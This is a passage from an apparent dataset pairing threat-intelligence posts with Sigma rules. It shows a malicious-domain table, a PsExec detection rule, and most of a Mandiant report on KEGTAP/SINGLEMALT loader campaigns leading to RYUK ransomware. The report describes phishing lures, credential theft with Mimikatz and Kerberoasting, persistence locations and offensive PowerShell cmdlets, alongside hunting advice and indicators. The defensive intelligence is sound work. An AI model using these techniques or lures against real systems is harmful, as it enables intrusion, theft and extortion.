1/29/20    | cylenceprotect[.]com           |\n| 1/30/20    | sophosdefence[.]com            |\n| 1/30/20    | taskshedulewin[.]com           |\n| 1/30/20    | windefenceinfo[.]com           |\n| 1/30/20    | lsasswininfo[.]com             |\n| 1/30/20    | update-wind[.]com              |\n| 1/30/20    | lsassupdate[.]com              |\n| 1/30/20    | renovatesystem[.]com           |\n| 1/31/20    | updatewinsoftr[.]com           |\n| 2/2/20     | cleardefencewin[.]com          |\n| 2/2/20     | checkwinupdate[.]com           |\n| 2/2/20     | havesetup[.]net                |\n| 2/3/20     | update-wins[.]com              |\n| 2/3/20     | conhostservice[.]com           |\n| 2/4/20     | microsoftupdateswin[.]com      |\n| 2/4/20     | iexploreservice[.]com          |\n| 2/12/20    | avrenew[.]com                  |\n| 2/12/20    | target-support[.]online        |\n| 2/12/20    | web-analysis[.]live            |\n| 2/14/20    | freeallsafe[.]com              |\n| 2/17/20    | windefens[.]com                |\n| 2/17/20    | defenswin[.]com                |\n| 2/17/20    | easytus[.]com                  |\n| 2/17/20    | greattus[.]com                 |\n| 2/17/20    | livetus[.]com                  |\n| 2/17/20    | comssite[.]com                 |\n| 2/17/20    | findtus[.]com                  |\n| 2/17/20    | bigtus[.]com                   |\n| 2/17/20    | aaatus[.]com                   |\n| 2/17/20    | besttus[.]com                  |\n| 2/17/20    | firsttus[.]com                 |\n| 2/17/20    | worldtus[.]com                 |\n| 2/26/20    | freeoldsafe[.]com              |\n| 2/26/20    | serviceupdates[.]net           |\n| 2/26/20    | topserviceupdater[.]com        |\n| 2/27/20    | myserviceupdater[.]com         |\n| 2/29/20    | myservicebooster[.]net         |\n| 2/29/20    | servicesbooster[.]org          |\n| 2/29/20    | brainschampions[.]com          |\n| 2/29/20    | myservicebooster[.]com         |\n| 2/29/20    | topservicesbooster[.]com       |\n| 2/29/20    | servicesbooster[.]com          |\n| 2/29/20    | topservicesecurity[.]org       |\n| 2/29/20    | topservicesecurity[.]net       |\n| 2/29/20    | topsecurityservice[.]net       |\n| 2/29/20    | myyserviceupdater[.]com        |\n| 2/29/20    | topservicesupdate[.]com        |\n| 2/29/20    | topservicesecurity[.]com       |\n| 2/29/20    | servicesecurity[.]org          |\n| 2/29/20    | myserviceconnect[.]net         |\n| 3/2/20     | topservicesupdates[.]com       |\n| 3/2/20     | yoursuperservice[.]com         |\n| 3/2/20     | topservicehelper[.]com         |\n| 3/2/20     | serviceuphelper[.]com          |\n| 3/2/20     | serviceshelpers[.]com          |\n| 3/2/20     | boostsecuritys[.]com           |\n| 3/3/20     | hakunamatatata[.]com           |\n| 3/8/20     | service-updater[.]com          |\n| 3/9/20     | secondserviceupdater[.]com     |\n| 3/9/20     | twelvethserviceupdater[.]com   |\n| 3/9/20     | twentiethservicehelper[.]com   |\n| 3/9/20     | twelfthservicehelper[.]com     |\n| 3/9/20     | tenthservicehelper[.]com       |\n| 3/9/20     | thirdserviceupdater[.]com      |\n| 3/9/20     | thirdservicehelper[.]com       |\n| 3/9/20     | tenthserviceupdater[.]com      |\n| 3/9/20     | thirteenthservicehelper[.]com  |\n| 3/9/20     | seventeenthservicehelper[.]com |\n| 3/9/20     | sixteenthservicehelper[.]com   |\n| 3/9/20     | sixthservicehelper[.]com       |\n| 3/9/20     | seventhservicehelper[.]com     |\n| 3/9/20     | seventhserviceupdater[.]com    |\n| 3/9/20     | sixthserviceupdater[.]com      |\n| 3/9/20     | secondservicehelper[.]com      |\n| 3/9/20     | ninthservicehelper[.]com       |\n| 3/9/20     | ninethserviceupdater[.]com     |\n| 3/9/20     | fourteenthservicehelper[.]com  |\n| 3/9/20     | fourthserviceupdater[.]com     |\n| 3/9/20     | firstserviceupdater[.]com      |\n| 3/9/20     | firstservisehelper[.]com       |\n| 3/9/20     | fifthserviceupdater[.]com      |\n| 3/9/20     | eleventhserviceupdater[.]com   |\n| 3/9/20     | fifthservicehelper[.]com       |\n| 3/9/20     | fourservicehelper[.]com        |\n| 3/9/20     | eighthservicehelper[.]com      |\n| 3/9/20     | eighteenthservicehelper[.]com  |\n| 3/9/20     | eighthserviceupdater[.]com     |\n| 3/9/20     | fifteenthservicehelper[.]com   |\n| 3/9/20     | nineteenthservicehelper[.]com  |\n| 3/9/20     | eleventhservicehelper[.]com    |\n| 3/14/20    | thirdservice-developer[.]com   |\n| 3/14/20    | fifthservice-developer[.]com   |\n| 3/15/20    | firstservice-developer[.]com   |\n| 3/16/20    | fourthservice-developer[.]com  |\n| 3/16/20    | ninethservice-developer[.]com  |\n| 3/16/20    | seventhservice-developer[.]com |\n| 3/16/20    | secondservice-developer[.]com  |\n| 3/16/20    | sixthservice-developer[.]com   |\n| 3/16/20    | tenthservice-developer[.]com   |\n| 3/16/20    | eithtservice-developer[.]com   |\n| 3/17/20    | servicedupdater[.]com          |\n| 3/17/20    | service-updateer[.]com         |\n| 3/19/20    | sexyservicee[.]com             |\n| 3/19/20    | serviceboostnumberone[.]com    |\n| 3/19/20    | servicedbooster[.]com          |\n| 3/19/20    | service-hunter[.]com           |\n| 3/19/20    | servicedhunter[.]com           |\n| 3/19/20    | servicedpower[.]com            |\n| 3/19/20    | sexycservice[.]com             |\n| 3/23/20    | yourserviceupdater[.]com       |\n| 3/23/20    | top-serviceupdater[.]com       |\n| 3/23/20    | top-servicebooster[.]com       |\n| 3/23/20    | serviceshelps[.]com            |\n| 3/23/20    | servicemonsterr[.]com          |\n| 3/23/20    | servicehunterr[.]com           |\n| 3/23/20    | service-helpes[.]com           |\n| 3/23/20    | servicecheckerr[.]com          |\n| 3/23/20    | newservicehelper[.]com         |\n| 3/23/20    | huntersservice[.]com           |\n| 3/23/20    | helpforyourservice[.]com       |\n| 3/23/20    | boostyourservice[.]com         |\n| 3/26/20    | developmasters[.]com           |\n| 3/26/20    | actionshunter[.]com            |\n| 5/4/20     | info-develop[.]com             |\n| 5/4/20     | ayechecker[.]com               |\n| 5/4/20     | service-booster[.]com          |\n| 9/18/20    | zapored[.]com                  |\n| 9/22/20    | gtrsqer[.]com                  |\n| 9/22/20    | chalengges[.]com               |\n| 9/22/20    | caonimas[.]com                 |\n| 9/22/20    | hakunaman[.]com                |\n| 9/22/20    | getinformationss[.]com         |\n| 9/22/20    | nomadfunclub[.]com             |\n| 9/22/20    | harddagger[.]com               |\n| 9/22/20    | errvghu[.]com                  |\n| 9/22/20    | reginds[.]com                  |\n| 9/22/20    | gameleaderr[.]com              |\n| 9/22/20    | razorses[.]com                 |\n| 9/22/20    | vnuret[.]com                   |\n| 9/22/20    | regbed[.]com                   |\n| 9/22/20    | bouths[.]com                   |\n| 9/23/20    | ayiyas[.]com                   |\n| 9/23/20    | serviceswork[.]net             |\n| 9/23/20    | moonshardd[.]com               |\n| 9/23/20    | hurrypotter[.]com              |\n| 9/23/20    | biliyilish[.]com               |\n| 9/23/20    | blackhoall[.]com               |\n| 9/23/20    | checkhunterr[.]com             |\n| 9/23/20    | daggerclip[.]com               |\n| 9/23/20    | check4list[.]com               |\n| 9/24/20    | chainnss[.]com                 |\n| 9/29/20    | hungrrybaby[.]com              |\n| 9/30/20    | martahzz[.]com                 |\n| 10/1/20    | jonsonsbabyy[.]com             |\n| 10/1/20    | wondergodst[.]com              |\n| 10/1/20    | zetrexx[.]com                  |\n| 10/1/20    | tiancaii[.]com                 |\n| 10/1/20    | cantliee[.]com                 |\n| 10/1/20    | realgamess[.]com               |\n| 10/1/20    | maybebaybe[.]com               |\n| 10/1/20    | saynoforbubble[.]com           |\n| 10/1/20    | chekingking[.]com              |\n| 10/1/20    | rapirasa[.]com                 |\n| 10/1/20    | raidbossa[.]com                |\n| 10/1/20    | mountasd[.]com                 |\n| 10/1/20    | puckhunterrr[.]com             |\n| 10/1/20    | pudgeee[.]com                  |\n| 10/1/20    | loockfinderrs[.]com            |\n| 10/1/20    | lindasak[.]com                 |\n| 10/1/20    | bithunterr[.]com               |\n| 10/1/20    | voiddas[.]com                  |\n| 10/1/20    | sibalsakie[.]com               |\n| 10/1/20    | giveasees[.]com                |\n| 10/1/20    | shabihere[.]com                |\n| 10/1/20    | tarhungangster[.]com           |\n| 10/1/20    | imagodd[.]com                  |\n| 10/1/20    | raaidboss[.]com                |\n| 10/1/20    | sunofgodd[.]com                |\n| 10/1/20    | rulemonster[.]com              |\n| 10/1/20    | loxliver[.]com                 |\n| 10/1/20    | servicegungster[.]com          |\n| 10/1/20    | kungfupandasa[.]com            |\n| 10/2/20    | check1domains[.]com            |\n| 10/5/20    | sweetmonsterr[.]com            |\n| 10/5/20    | qascker[.]com                  |\n| 10/7/20    | remotessa[.]com                |\n| 10/7/20    | cheapshhot[.]com               |\n| 10/7/20    | havemosts[.]com                |\n| 10/7/20    | unlockwsa[.]com                |\n| 10/7/20    | sobcase[.]com                  |\n| 10/7/20    | zhameharden[.]com              |\n| 10/7/20    | mixunderax[.]com               |\n| 10/7/20    | bugsbunnyy[.]com               |\n| 10/7/20    | fastbloodhunter[.]com          |\n| 10/7/20    | serviceboosterr[.]com          |\n| 10/7/20    | servicewikii[.]com             |\n| 10/7/20    | secondlivve[.]com              |\n| 10/7/20    | quwasd[.]com                   |\n| 10/7/20    | luckyhunterrs[.]com            |\n| 10/7/20    | wodemayaa[.]com                |\n| 10/7/20    | hybriqdjs[.]com                |\n| 10/7/20    | gunsdrag[.]com                 |\n| 10/7/20    | gungameon[.]com                |\n| 10/7/20    | servicemount[.]com             |\n| 10/7/20    | servicesupdater[.]com          |\n| 10/7/20    | service-boosterr[.]com         |\n| 10/7/20    | serviceupdatter[.]com          |\n| 10/7/20    | dotmaingame[.]com              |\n| 10/12/20   | backup1service[.]com           |\n| 10/13/20   | bakcup-monster[.]com           |\n| 10/13/20   | bakcup-checker[.]com           |\n| 10/13/20   | backup-simple[.]com            |\n| 10/13/20   | backup-leader[.]com            |\n| 10/13/20   | backup-helper[.]com            |\n| 10/13/20   | service-checker[.]com          |\n| 10/13/20   | nasmastrservice[.]com          |\n| 10/14/20   | service-leader[.]com           |\n| 10/14/20   | nas-simple-helper[.]com        |\n| 10/14/20   | nas-leader[.]com               |\n| 10/14/20   | boost-servicess[.]com          |\n| 10/14/20   | elephantdrrive[.]com           |\n| 10/15/20   | service-hellper[.]com          |\n| 10/16/20   | top-backuphelper[.]com         |\n| 10/16/20   | best-nas[.]com                 |\n| 10/16/20   | top-backupservice[.]com        |\n| 10/16/20   | bestservicehelper[.]com        |\n| 10/16/20   | backupnas1[.]com               |\n| 10/16/20   | backupmastter[.]com            |\n| 10/16/20   | best-backup[.]com              |\n| 10/17/20   | viewdrivers[.]com              |\n| 10/19/20   | topservicebooster[.]com        |\n| 10/19/20   | topservice-masters[.]com       |\n| 10/19/20   | topbackupintheworld[.]com      |\n| 10/19/20   | topbackup-helper[.]com         |\n| 10/19/20   | simple-backupbooster[.]com     |\n| 10/19/20   | top3-services[.]com            |\n| 10/19/20   | backup1services[.]com          |\n| 10/21/20   | backupmaster-service[.]com     |\n| 10/21/20   | backupmasterservice[.]com      |\n| 10/21/20   | service1updater[.]com          |\n| 10/21/20   | driverdwl[.]com                |\n| 10/21/20   | backup1master[.]com            |\n| 10/21/20   | boost-yourservice[.]com        |\n| 10/21/20   | checktodrivers[.]com           |\n| 10/21/20   | backup1helper[.]com            |\n| 10/21/20   | driver1updater[.]com           |\n| 10/21/20   | driver1master[.]com            |\n| 10/23/20   | view-backup[.]com              |\n| 10/23/20   | top3servicebooster[.]com       |\n| 10/23/20   | servicereader[.]com            |\n| 10/23/20   | servicehel[.]com               |\n| 10/23/20   | driver-boosters[.]com          |\n| 10/23/20   | service1update[.]com           |\n| 10/23/20   | service-hel[.]com              |\n| 10/23/20   | driver1downloads[.]com         |\n| 10/23/20   | service1view[.]com             |\n| 10/23/20   | backups1helper[.]com           |\n| 10/25/20   | idriveview[.]com               |\n| 10/26/20   | debug-service[.]com            |\n| 10/26/20   | idrivedwn[.]com                |\n| 10/28/20   | driverjumper[.]com             |\n| 10/28/20   | service1boost[.]com            |\n| 10/28/20   | idriveupdate[.]com             |\n| 10/28/20   | idrivehepler[.]com             |\n| 10/28/20   | idrivefinder[.]com             |\n| 10/28/20   | idrivecheck[.]com              |\n| 10/28/20   | idrivedownload[.]com           |\n\n---\n\nPosted in Threat Intelligence, Security & Identity",
    "sigma_rule": {
      "title": "Psexec Execution",
      "id": "730fc21b-eaff-474b-ad23-90fd265d4988",
      "status": "test",
      "description": "Detects user accept agreement execution in psexec commandline",
      "references": [
        "https://cloud.google.com/blog/topics/threat-intelligence/kegtap-and-singlemalt-with-a-ransomware-chaser/"
      ],
      "author": "omkar72",
      "date": "2020-10-30",
      "modified": "2023-02-28",
      "tags": [
        "attack.execution",
        "attack.t1569",
        "attack.t1021"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": [
          {
            "Image|endswith": "\\psexec.exe"
          },
          {
            "OriginalFileName": "psexec.c"
          }
        ],
        "condition": "selection"
      },
      "falsepositives": [
        "Administrative scripts."
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_sysinternals_psexec_execution.yml",
    "id": "582"
  },
  {
    "url": "https://cloud.google.com/blog/topics/threat-intelligence/kegtap-and-singlemalt-with-a-ransomware-chaser/",
    "markdown": "# Unhappy Hour Special: KEGTAP and SINGLEMALT With a Ransomware Chaser\n\n**October 28, 2020**\n\n---\n\nThroughout 2020, ransomware activity has become increasingly prolific, relying on an ecosystem of distinct but co-enabling operations to gain access to targets of interest before conducting extortion. Mandiant Threat Intelligence has tracked several loader and backdoor campaigns that lead to the post-compromise deployment of ransomware, sometimes within 24 hours of initial compromise. Effective and fast detection of these campaigns is key to mitigating this threat.\n\nThe malware families enabling these attacks previously reported by Mandiant to intelligence subscribers include KEGTAP/BEERBOT, SINGLEMALT/STILLBOT, and WINEKEY/CORKBOT. While these malware families communicate with the same command and control infrastructure (C2) and are close to functional parity, there are minimal code overlaps across them. Other security researchers have tracked these malware families under the names BazarLoader and BazarBackdoor or Team9.\n\nThe operators conducting these campaigns have actively targeted hospitals, retirement communities, and medical centers, even in the midst of a global health crisis, demonstrating a clear disregard for human life.\n\n## Email Campaign TTPs\n\nCampaigns distributing KEGTAP, SINGLEMALT, and WINEKEY have been sent to individuals at organizations across a broad range of industries and geographies using a series of shifting delivery tactics, techniques, and procedures (TTPs). Despite the frequent changes seen across these campaigns, the following has remained consistent across recent activity:\n\n- Emails contain an in-line link to an actor-controlled Google Docs document, typically a PDF file.\n- This document contains an in-line link to a URL hosting a malware payload.\n- Emails masquerade as generic corporate communications, including follow-ups about documents and phone calls or emails crafted to appear related to complaints, terminations, bonuses, contracts, working schedules, surveys, or queries about business hours.\n- Some email communications have included the recipient’s name or employer name in the subject line and/or email body.\n\nDespite this uniformity, the associated TTPs have otherwise changed regularly—both between campaigns and across multiple spam runs seen in the same day. Notable ways that these campaigns have varied over time include:\n\n- Early campaigns were delivered via Sendgrid and included in-line links to Sendgrid URLs that would redirect users to attacker-created Google documents. In contrast, recent campaigns have been delivered via attacker-controlled or compromised email infrastructure and have commonly contained in-line links to attacker-created Google documents, although they have also used links associated with the Constant Contact service.\n- The documents loaded by these in-line links are crafted to appear somewhat relevant to the theme of the email campaign and contain additional links along with instructions directing users to click on them. When clicked, these links download malware binaries with file names masquerading as document files. Across earlier campaigns, these malware binaries were hosted on compromised infrastructure; however, the attackers have shifted to hosting their malware on legitimate web services, including Google Drive, Basecamp, Slack, Trello, Yougile, and JetBrains.\n- In recent campaigns, the malware payloads have been hosted on numerous URLs associated with one or more of these legitimate services. In cases where the payloads have been taken down, the actors have sometimes updated their Google documents to contain new, working links.\n- Some campaigns have also incorporated customization, including emails with internal references to the recipients’ organizations and organizations’ logos embedded into the Google Docs documents.\n\n```image\nAlt: Figure 1: Email containing internal references to target an organization’s name\nDescription: The image depicts a screenshot of an email titled 'Contract cancellation reminder.' The email appears to be crafted to resemble a legitimate corporate communication, with a greeting and a message informing the recipient that a contract with their company is temporarily suspended. It includes a link to a Google Docs document, which is likely intended to download malware when clicked. The email uses an official-sounding sender name, 'Bethanne Wesley,' and features a professional layout, making it seem credible to the recipient.\nTranscription: |\n  Contract cancellation reminder\n  \n  From: Bethanne Wesley <andrew.constantine@littlernews.mobi>\n  Date: Today at 11:42 AM\n  \n  Good day to you, [REDACTED]!\n  Unfortunately, we are here to tell you that our contract with [REDACTED] company is temporarily suspended because of the riots on the factory house. Payments compensation info and contract you can find here:\n  https://docs.google.com/document/d/e/2PACX-1vTX6R2anNzKGbShQGLLz_U7DvhhakDw3kOO3b6-0Gr1w6BmDwmFsXM994WAnmptW4D17wANH7l_2/pub\n  \n  We are sorry for such troubles.\n  \n  Regards,\n  Bethanne Wesley\n```\n\n```image\nAlt: Figure 2: Google Docs PDF document containing a target organization’s logo\nDescription: The image depicts a Google Drive document labeled 'Termination List.PDF' featuring a preview for a document with the title 'Termination List #49376-22/10'. A blue button labeled 'START' is prominently displayed, indicating that users can click to download the document. The message suggests that the document is ready for preview and provides instructions for downloading, emphasizing that the preview is available only on desktop computers. This layout is typical of phishing attempts, which often use such tactics to lure users into downloading malicious payloads.\nTranscription: |\n  Termination List.PDF\n  Updated automatically every 5 minutes\n  \n  Termination List #49376-22/10\n  Termination List #49376-22/10 is ready to preview. If downloading doesn't start automatically, click the buttons below.\n  \n  [START]\n  \n  Preview is available only on desktop computers.\n  \n  Published by Google Drive – Report Abuse\n```\n\nHiding the final payload behind multiple links is a simple yet effective way to bypass some email filtering technologies. Various technologies have the ability to follow links in an email to try to identify malware or malicious domains; however, the number of links followed can vary. Additionally, embedding links within a PDF document further makes automated detection and link-following difficult.\n\n## Post-Compromise TTPs\n\nGiven the possibility that accesses obtained from these campaigns may be provided to various operators to monetize, the latter-stage TTPs, including ransomware family deployed, may vary across intrusions. A notable majority of cases where Mandiant has had visibility into these post-compromise TTPs have been attributable to UNC1878, a financially motivated actor that monetizes network access via the deployment of RYUK ransomware.\n\n### Establish Foothold\n\nOnce the loader and backdoor have been executed on the initial victim host, the actors have used this initial backdoor to download POWERTRICK and/or Cobalt Strike BEACON payloads to establish a foothold. Notably, the respective loader and backdoor as well as POWERTRICK have typically been installed on a small number of hosts in observed incidents, suggesting these payloads may be reserved for establishing a foothold and performing initial network and host reconnaissance. However, BEACON is frequently found on a larger number of hosts and used throughout various stages of the attack lifecycle.\n\n### Maintain Presence\n\nBeyond the preliminary phases of each intrusion, we have seen variations in how these attackers have maintained presence after establishing an initial foothold or moving laterally within a network. In addition to the use of common post-exploitation frameworks such as Cobalt Strike, Metasploit, and EMPIRE, we have observed the use of other backdoors, including ANCHOR, that we also believe to be under control of the actors behind TrickBot.\n\n- The loaders associated with this activity can maintain persistence through reboot by using at least four different techniques, including creating a scheduled task, adding itself to the startup folder as a shortcut, creating a scheduled Microsoft BITS job using `/setnotifycmdline`, and adding itself to the Userinit value under the following registry key:\n  - `HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon`\n- Actors have downloaded POWERTRICK, Metasploit Meterpreter, and Cobalt Strike BEACON payloads following the initial compromise. BEACON payloads have commonly been executed after moving laterally to new hosts within the victim network. The attackers have employed Cobalt Strike payloads crafted to maintain persistence through reboot via a scheduled task on critical systems in victim environments. Notably, BEACON is the backdoor observed most frequently across these incidents.\n- We have observed actors executing encoded PowerShell commands that ultimately executed instances of the PowerShell EMPIRE backdoor.\n- The actors were observed using BEACON to execute PowerLurk's Register-MaliciousWmiEvent cmdlet to register WMI events used to kill processes related to security tools and utilities, including Task Manager, WireShark, TCPView, ProcDump, Process Explorer, Process Monitor, NetStat, PSLoggedOn, LogonSessions, Process Hacker, Autoruns, AutorunsSC, RegEdit, and RegShot.\n- In at least one case, attackers have maintained access to a victim environment using stolen credentials to access corporate VPN infrastructure configured to require only single-factor authentication.\n\n### Escalate Privileges\n\nThe most commonly observed methods for escalating privileges in these incidents have involved the use of valid credentials. The actors used a variety of techniques for accessing credentials stored in memory or on disk to access privileged accounts.\n\n- The actors used valid credentials obtained using MimiKatz variants to escalate privileges. We’ve observed Mimikatz being executed both from the file system of victim hosts and via PowerShell cmdlets executed via Cobalt Strike BEACON.\n- Actors have gained access to credentials via exported copies of the `ntds.dit` Active Directory database and SYSTEM and SECURITY registry hives from a Domain Controller.\n- In multiple instances, the actors have launched attacks against Kerberos, including the use of RUBEUS, the MimiKatz Kerberos module, and the Invoke-Kerberoast cmdlet.\n\n### Reconnaissance\n\nThe approaches taken to perform host and network reconnaissance across these incidents varied; however, a significant portion of observed reconnaissance activity has revolved around Activity Directory enumeration using publicly available utilities such as BLOODHOUND, SHARPHOUND, or ADFind, as well as the execution of PowerShell cmdlets using Cobalt Strike BEACON.\n\n- BEACON has been installed on a large number of systems across these intrusions and has been used to execute various reconnaissance commands including both built-in host commands and PowerShell cmdlets. Observed PowerShell cmdlets include:\n  - `Get-GPPPassword`\n  - `Invoke-AllChecks`\n  - `Invoke-BloodHound`\n  - `Invoke-EternalBlue`\n  - `Invoke-FileFinder`\n  - `Invoke-HostRecon`\n  - `Invoke-Inveigh`\n  - `Invoke-Kerberoast`\n  - `Invoke-LoginPrompt`\n  - `Invoke-mimikittenz`\n  - `Invoke-ShareFinder`\n  - `Invoke-UserHunter`\n- Mandiant has observed actors using POWERTRICK to execute built-in system commands on the initial victim host, including `ipconfig`, `findstr`, and `cmd.exe`.\n- The actors leveraged publicly available utilities Adfind, BLOODHOUND, SHARPHOUND, and KERBRUTE on victim networks to collect Active Directory information and credentials.\n- WMIC commands have been used to perform host reconnaissance, including listing installed software, listing running processes, and identifying operating system and system architecture.\n- The actors have used a batch script to ping all servers identified during Active Directory enumeration and output the results to `res.txt`.\n- The actors used the `Nltest` command to list domain controllers.\n\n### Lateral Movement\n\nLateral movement was most commonly accomplished using valid credentials in combination with Cobalt Strike BEACON, RDP, and SMB, or using the same backdoors used to establish a foothold in victim networks.\n\n- The actors have regularly leveraged Cobalt Strike BEACON and Metasploit Meterpreter to move laterally within victim environments.\n- The actors commonly moved laterally within victim environments using compromised accounts—both those belonging to regular users and accounts with administrative privileges. In addition to the use of common post-exploitation frameworks, lateral movement has also been achieved using WMIC commands and the Windows RDP and SMB protocols.\n- The actors used the Windows `net use` command to connect to Windows admin shares to move laterally.\n\n### Complete Mission\n\nMandiant is directly aware of incidents involving KEGTAP that included the post-compromise deployment of RYUK ransomware. We have also observed instances where ANCHOR infections, another backdoor associated with the same actors, preceded CONTI or MAZE deployment.\n\n- In at least one case, an executable was observed that was designed to exfiltrate files via SFTP to an attacker-controlled server.\n- The actors have used Cobalt Strike BEACON to exfiltrate data created through network reconnaissance activities as well as user files.\n- The actors were observed deleting their tools from victim hosts in an attempt to remove indicators of compromise.\n- The actors have used their access to the victim network to deploy ransomware payloads. There is evidence to suggest that RYUK ransomware was likely deployed via PsExec, but other scripts or artifacts related to the distribution process were not available for forensic analysis.\n\n## Hunting Strategies\n\nIf an organization identifies a host with an active infection believed to be an instance of KEGTAP or a parallel malware family, the following containment actions are recommended. Note that due to the velocity of this intrusion activity, these actions should be taken in parallel.\n\n- Isolate and perform a forensic review of any impacted systems.\n- Review incoming emails to the user that owns the impacted device for emails matching the distribution campaigns, and take action to remove the messages from all mailboxes.\n- Identify the URLs used by the phishing campaign and block them using proxy or network security devices.\n- Reset credentials for any user accounts associated with execution of the malware.\n- Perform an enterprise-wide review for lateral movement authentication from the impacted systems.\n- Check authentication logs from any single-factor remote access solutions that may exist (VPN, VDI, etc.) and move towards multi-factor authentication (MFA) as soon as possible.\n\nAn enterprise-wide effort should be made to identify host-based artifacts related to the execution of first-stage malware and all post-intrusion activity associated with this activity. Some baseline approaches to this have been captured as follows.\n\nActivity associated with the KEGTAP loader can often be identified via a review of system startup folders and Userinit values under the `HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon` registry key.\n\n```\n%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\adobe.lnk\n```\n\n*Figure 3: Example LNK file associated with KEGTAP persistence within a system’s startup folders*\n\nSINGLEMALT employs BITS to maintain persistence through reboot and can often be identified via a review of anomalous BITS jobs. SINGLEMALT uses a well-documented BITS persistence mechanism that intentionally creates a job to download a non-existent URL, which will trigger a failure event. The job is set to retry on a regular interval, thus ensuring the malware continues to run. To review the BITS job on a host, run the command `bitsadmin /list`.\n\n- Display name may be “Adobe Update”, “System autoupdate” or another generic value.\n- Notify state may be set to Fail (Status 2).\n- FileList URL value may be set to the local host or a URL that does not exist.\n- The Notification Command Line value may contain the path to the SINGLEMALT sample and/or a command to move it to a new location then start it.\n- The Retry Delay value will be set.\n\nWINEKEY maintains persistence through reboot via the use of registry RUN keys. Searching for anomalous RUN keys enterprise-wide can help to identify systems impacted by this malware.\n\n```\nKey: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Backup Mgr\n\nValue: Path to the backdoor\n```\n\n*Figure 4: Example registry RUN key used by WINEKEY to maintain persistence*\n\nThe ANCHOR backdoor has been seen across a subset of intrusions associated with this activity and can often be identified via the scheduled tasks it uses to maintain persistence through reboot. The scheduled tasks created by ANCHOR are often unnamed, although that is not always the case.\n\n- The identification of named scheduled tasks associated with ANCHOR persistence may be constructed according to the following pattern: `<Random directory within %APPDATA%> autoupdate#<random number>`.\n- All unnamed scheduled tasks should be reviewed, particularly those with a creation date consistent with the time of the suspected compromise.\n\nAlthough it is a low fidelity indicator, ANCHOR activity may also sometimes be identified by searching for binaries within the `C:\\Windows\\SysWOW64` directory that have a file name matching the following pattern: `<8 random lowercase chars>.exe`. Stacking or sorting on file creation timestamps in the `C:\\Windows\\SysWOW64` directory may also help identify malicious files, as the directory should be mostly static.\n\nPost-exploitation activity associated with the deployment of ransomware following these campaigns is typically conducted using the Cobalt Strike attack framework. The BEACON payload associated with Cobalt Strike can often be identified via a review of existing registered services and service creation events (Event ID 7045), both markers of the mechanism it most commonly employs to maintain persistence.\n\nThe following are additional strategies that may aid in identifying associated activity:\n\n- Organizations can review web proxy logs in order to identify HXXP requests for file storage, project management, collaboration, or communication services with a referrer from a Google Docs document.\n- During the associated post-compromise activity, attackers have commonly staged their tools and data in the PerfLogs directory and C$ share.\n- While collecting data used to enable later-stage operations, the attackers commonly leave instances of `ntds.dit` and exports of the SYSTEM and SECURITY registry hives on impacted systems.\n\n## Hardening Strategies\n\nThe actions taken by the actors to escalate privileges and move laterally in an environment use well-documented techniques that search the network and Active Directory for common misconfigurations that expose credentials and systems for abuse. Organizations can take steps to limit the impact and effectiveness of these techniques. For more in-depth recommendations see our ransomware protection white paper.\n\n- Harden service accounts against brute force and password guessing attacks. Most organizations have at least a few service accounts with passwords set to never expire. These passwords are likely old and insecure. Make a best effort to reset as many of these accounts as possible to long and complex passwords. In cases where it is possible, migrate to MSAs and gMSAS for automated rotation.\n- Prevent the usage of privileged accounts for lateral movement. Use GPOs to restrict the ability for privileged accounts such as Domain Administrators and privileged service accounts from initiating RDP connections and network logins. Actors often pick just a few accounts to use for RDP; by limiting the number of potential accounts, you provide detection opportunities and opportunities to slow the actor.\n- Block internet access for servers where possible. Often times there is no business need for servers, especially AD infrastructure systems, to access the Internet. The actors often choose high-uptime servers for the deployment of post-exploitation tools such as BEACON.\n- Block uncategorized and newly registered domains using web proxies or DNS filters. Often the final payload delivered via phishing is hosted on a compromised third-party website that does not have a business categorization.\n- Ensure that critical patches are installed on Windows systems as well as network infrastructure. We have observed attackers exploiting well-known vulnerabilities such as Zerologon (CVE-2020-1472) to escalate privileges in an environment prior to deploying ransomware. In other cases, possibly unrelated to UNC1878, we have observed threat actors gain access to an environment through vulnerable VPN infrastructure before deploying ransomware.\n\nFor more intelligence on ransomware and other threats, please register for Mandiant Advantage Free, a no-cost version of our threat intelligence platform. Check out this episode of *State of the Hack* for additional information on this threat.\n\n## Campaign Indicators\n\n### Sample Email Subjects / Patterns\n\n- `<(first|last)-name>: Important Information`\n- `<Company Name>`\n- `<Company Name> complaint`\n- `<(first|last)-name>`\n- Agreement cancellation message\n- Agreement suspension notice\n- Contract cancellation reminder\n- FW: `<Name>` Annual Bonus Report is Ready\n- RE: `<(first|last)-name>`: Your Payslip for October\n- RE: `<Company Name>` Employee Survey\n- RE: `<Name>` termination list\n- RE: `<Company Name>` office\n- RE: Urgent `<Company Name>` Employee Internal Survey\n- RE: Working schedule adjustment\n- RE: Your Payslip for September\n\n### Example Malware Family MD5s\n\n- **KEGTAP**\n  - `df00d1192451268c31c1f8568d1ff472`\n- **BEERBOT**\n  - `6c6a2bfa5846fab374b2b97e65095ec9`\n- **SINGLEMALT**\n  - `37aa5690094cb6d638d0f13851be4246`\n- **STILLBOT**\n  - `3176c4a2755ae00f4fffe079608c7b25`\n- **WINEKEY**\n  - `9301564bdd572b0773f105287d8837c4`\n- **CORKBOT**\n  - `0796f1c1ea0a142fc1eb7109a44c86cb`\n\n### Code Signing Certificate CNs\n\n- ARTBUD RADOM SP Z O O\n- BESPOKE SOFTWARE SOLUTIONS LIMITED\n- Best Fud, OOO\n- BlueMarble GmbH\n- CHOO FSP, LLC\n- Company Megacom SP Z O O\n- ESTELLA, OOO\n- EXON RENTAL SP Z O O\n- Geksan LLC\n- GLOBAL PARK HORIZON SP Z O O\n- Infinite Programming Limited\n- James LTH d.o.o.\n- Logika OOO\n- MADAS d.o.o.\n- MUSTER PLUS SP Z O O\n- NEEDCODE SP Z O O\n- Nordkod LLC\n- NOSOV SP Z O O\n- OOO MEP\n- PLAN CORP PTY LTD\n- REGION TOURISM LLC\n- RESURS-RM OOO\n- Retalit LLC\n- Rumikon LLC\n- SNAB-RESURS, OOO\n- TARAT d.o.o.\n- TES LOGISTIKA d.o.o.\n- 